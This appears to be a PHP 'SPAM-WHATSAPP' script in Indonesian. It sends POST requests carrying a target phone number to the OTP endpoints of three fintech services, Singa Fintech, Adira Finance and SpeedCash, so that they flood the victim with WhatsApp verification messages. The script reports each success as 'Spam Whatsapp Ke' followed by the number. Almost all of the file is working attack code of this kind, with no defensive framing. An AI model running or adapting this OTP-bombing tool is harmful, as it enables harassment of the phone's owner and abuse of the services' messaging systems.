<?php
// filepath: z:\sera\SPAM-WHATSAPP\pam.php

// ================== SINGA FINTECH ==================
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://api.singafintech.com/otp/send',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"phone":"'.$nomor.'"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type: application/json'
  ),
));
$response = curl_exec($curl);
$result = fetch_value($response,'"success":',',');
if ($result == 'true') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
} else {
  echo " SINGA FINTECH ".$response."\n";
}

// ================== ADIRA FINANCE ==================
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"mobileNumber":"'.$nomor.'","type":"prospect-create","channel":"whatsapp"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type:  application/json; charset=utf-8'
  ),
));
$response = curl_exec($curl);
$result = fetch_value($response,'{"message":"','","');
if ($result == 'success') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
} else {
  echo " ADIRAKU ".$response."\n";
}

// ================== SPEEDCASH ==================
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://api.speedcash.co.id/otp/request',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"phone":"'.$nomor.'"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type: application/json'
  ),
));
$response = curl_exec($curl);
$result = fetch_value($response,'"success":',',');
if ($result == 'true') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
} else {
  echo " SPEEDCASH ".$response."\n";
}

// ================== FUNGSI PENDUKUNG ==================
function color($color = "default", $text = null) {
    // ...implementasi pewarnaan terminal...
    return $text;
}

function fetch_value($str, $find_start, $find_end) {
    $start = strpos($str, $find_start);
    if ($start === false) return "";
    $start += strlen($find_start);
    $end = strpos($str, $find_end, $start);
    if ($end === false) return "";
    return substr($str, $start, $end - $start);
}

function acak($length = 3) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}